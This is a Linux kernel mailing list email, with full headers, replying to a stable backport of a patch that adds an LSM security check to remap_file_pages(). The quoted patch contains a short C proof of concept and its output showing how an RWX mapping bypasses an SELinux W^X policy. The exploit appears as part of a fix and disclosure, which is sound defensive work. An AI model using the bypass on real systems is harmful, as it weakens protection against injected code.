Received: from smtp-fw-80006.amazon.com (smtp-fw-80006.amazon.com [99.78.197.217])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3C031DED7C
	for <patches@lists.linux.dev>; Wed, 19 Feb 2025 10:54:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=99.78.197.217
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1739962481; cv=none; b=f7E6s8MUgx0J3Zg1hHTA/S6I4JMDwFPUS1FurOQI9isks1z73edO52Rv1K8EOyZzBZZV59a1QQ/Zw2WQtcyPWVNbw/aGE8n07p5jDFnLEQQqE7jIn2FrAimXGx81pdPa742MrG86KI5smq+evxhpYbqQtKUq2x7GUWab/0FBlWY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1739962481; c=relaxed/simple;
	bh=CfG5rFGHn6tfImq7Y/p/eC8/S5f+1eKRF+J81O2jlYI=;
	h=From:To:CC:Subject:In-Reply-To:References:Date:Message-ID:
	 MIME-Version:Content-Type; b=YY38jCHFaW4RzXgxg9BrhlXkU1BA8iOEhwL6VtfJ+PVLbendS/16lk2LmFPrDKN70bNMhbNzPaL+KdtaP332QEYFTyZW6syxsBwrWOlcekyss5IgCye0odUkBxaaXmPhv7+GnmDSw/jfPa0yHn8bzThP87UcJpOd0KGdvOi6xpo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.de; spf=pass smtp.mailfrom=amazon.de; dkim=pass (1024-bit key) header.d=amazon.de header.i=@amazon.de header.b=IgzpRwDj; arc=none smtp.client-ip=99.78.197.217
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.de
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=amazon.de
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=amazon.de header.i=@amazon.de header.b="IgzpRwDj"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=amazon.de; i=@amazon.de; q=dns/txt; s=amazon201209;
  t=1739962480; x=1771498480;
  h=from:to:cc:subject:in-reply-to:references:date:
   message-id:mime-version;
  bh=m8/uczRdJiZTSA4aIpkwgqgqOCS1QSkQKWfQCxDWJnc=;
  b=IgzpRwDjciPvI47kN8XCxScJO/Uloa3Ltt2IiZSTi0YKVPpVgCGhzHnM
   73V2eKcmNyWn8H7Q9fpvbsffhtnO1XzKHQlw/RzUMjQYr0ZNhdscUnGsA
   D9JBi214LayS0te1P3Idahvx9hM0e39TJj60fAh4m6pSJRp5HVEbCxJKb
   E=;
X-IronPort-AV: E=Sophos;i="6.13,298,1732579200"; 
   d="scan'208";a="23901110"
Received: from pdx4-co-svc-p1-lb2-vlan3.amazon.com (HELO smtpout.prod.us-west-2.prod.farcaster.email.amazon.dev) ([10.25.36.214])
  by smtp-border-fw-80006.pdx80.corp.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 19 Feb 2025 10:54:38 +0000
Received: from EX19MTAUWB001.ant.amazon.com [10.0.38.20:65488]
 by smtpin.naws.us-west-2.prod.farcaster.email.amazon.dev [10.0.10.141:2525] with esmtp (Farcaster)
 id 4b3bd0a5-ff16-4d77-ac5d-ab05cf93c3b8; Wed, 19 Feb 2025 10:54:37 +0000 (UTC)
X-Farcaster-Flow-ID: 4b3bd0a5-ff16-4d77-ac5d-ab05cf93c3b8
Received: from EX19EXOUWA001.ant.amazon.com (10.250.64.209) by
 EX19MTAUWB001.ant.amazon.com (10.250.64.248) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.1258.39;
 Wed, 19 Feb 2025 10:54:37 +0000
Received: from EX19MTAUWC001.ant.amazon.com (10.250.64.145) by
 EX19EXOUWA001.ant.amazon.com (10.250.64.209) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.1258.39;
 Wed, 19 Feb 2025 10:54:37 +0000
Received: from email-imr-corp-prod-pdx-all-2b-5ec155c2.us-west-2.amazon.com
 (10.25.36.210) by mail-relay.amazon.com (10.250.64.145) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id
 15.2.1258.39 via Frontend Transport; Wed, 19 Feb 2025 10:54:37 +0000
Received: from dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com (dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com [172.19.91.144])
	by email-imr-corp-prod-pdx-all-2b-5ec155c2.us-west-2.amazon.com (Postfix) with ESMTP id D674440273;
	Wed, 19 Feb 2025 10:54:36 +0000 (UTC)
Received: by dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com (Postfix, from userid 23027615)
	id 6B9EE4EB3; Wed, 19 Feb 2025 10:54:36 +0000 (UTC)
From: Pratyush Yadav <ptyadav@amazon.de>
To: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CC: <stable@vger.kernel.org>, Shu Han <ebpqwerty472123@gmail.com>,
	<patches@lists.linux.dev>, Stephen Smalley <stephen.smalley.work@gmail.com>,
	Paul Moore <paul@paul-moore.com>, Bin Lan <bin.lan.cn@windriver.com>
Subject: Re: [PATCH 5.10] mm: call the security_mmap_file() LSM hook in
 remap_file_pages()
In-Reply-To: <2025021906-campus-glowworm-8aea@gregkh> (Greg Kroah-Hartman's
	message of "Wed, 19 Feb 2025 09:12:01 +0100")
References: <20250210191056.58787-1-ptyadav@amazon.de>
	<2025021906-campus-glowworm-8aea@gregkh>
Date: Wed, 19 Feb 2025 10:54:36 +0000
Message-ID: <mafs0ldu2kxw3.fsf_-_@amazon.de>
User-Agent: Gnus/5.13 (Gnus v5.13)
Precedence: bulk
X-Mailing-List: patches@lists.linux.dev
List-Id: <patches.lists.linux.dev>
List-Subscribe: <mailto:patches+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:patches+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain

On Wed, Feb 19 2025, Greg Kroah-Hartman wrote:

> On Mon, Feb 10, 2025 at 07:10:54PM +0000, Pratyush Yadav wrote:
>> From: Shu Han <ebpqwerty472123@gmail.com>
>>
>> commit ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 upstream.
>>
>> The remap_file_pages syscall handler calls do_mmap() directly, which
>> doesn't contain the LSM security check. And if the process has called
>> personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
>> RW pages, this will actually result in remapping the pages to RWX,
>> bypassing a W^X policy enforced by SELinux.
>>
>> So we should check prot by security_mmap_file LSM hook in the
>> remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
>> potentially permits an attacker to bypass a W^X policy enforced by
>> SELinux.
>>
>> The bypass is similar to CVE-2016-10044, which bypass the same thing via
>> AIO and can be found in [1].
>>
>> The PoC:
>>
>> $ cat > test.c
>>
>> int main(void) {
>>       size_t pagesz = sysconf(_SC_PAGE_SIZE);
>>       int mfd = syscall(SYS_memfd_create, "test", 0);
>>       const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
>>               MAP_SHARED, mfd, 0);
>>       unsigned int old = syscall(SYS_personality, 0xffffffff);
>>       syscall(SYS_personality, READ_IMPLIES_EXEC | old);
>>       syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
>>       syscall(SYS_personality, old);
>>       // show the RWX page exists even if W^X policy is enforced
>>       int fd = open("/proc/self/maps", O_RDONLY);
>>       unsigned char buf2[1024];
>>       while (1) {
>>               int ret = read(fd, buf2, 1024);
>>               if (ret <= 0) break;
>>               write(1, buf2, ret);
>>       }
>>       close(fd);
>> }
>>
>> $ gcc test.c -o test
>> $ ./test | grep rwx
>> 7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)
>>
>> Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
>> Cc: stable@vger.kernel.org
>> Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
>> Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
>> [PM: subject line tweaks]
>> Signed-off-by: Paul Moore <paul@paul-moore.com>
>> Signed-off-by: Pratyush Yadav <ptyadav@amazon.de>
>> ---
>>  mm/mmap.c | 4 ++++
>>  1 file changed, 4 insertions(+)
>>
>> diff --git a/mm/mmap.c b/mm/mmap.c
>> index 9f76625a1743..2c17eb840e44 100644
>> --- a/mm/mmap.c
>> +++ b/mm/mmap.c
>> @@ -3078,8 +3078,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsigned long, start, unsigned long, size,
>>       }
>>
>>       file = get_file(vma->vm_file);
>> +     ret = security_mmap_file(vma->vm_file, prot, flags);
>> +     if (ret)
>> +             goto out_fput;
>>       ret = do_mmap(vma->vm_file, start, size,
>>                       prot, flags, pgoff, &populate, NULL);
>> +out_fput:
>>       fput(file);
>>  out:
>>       mmap_write_unlock(mm);
>> --
>> 2.47.1
>>
>>
>
> This has required fixes for this commit which you did not include here,
> so I'm going to have to drop this from the tree.  Same for the other
> branch you submitted this against.
>
> Please be more careful and always include all needed commits to resolve
> a problem, we don't want to purposfully add bugs to the kernel tree that
> we have already resolved.

My bad. I wanted to fix the CVE assigned to this patch and I didn't
think of looking for follow-up fixes. Will do that next time around.

-- 
Regards,
Pratyush Yadav
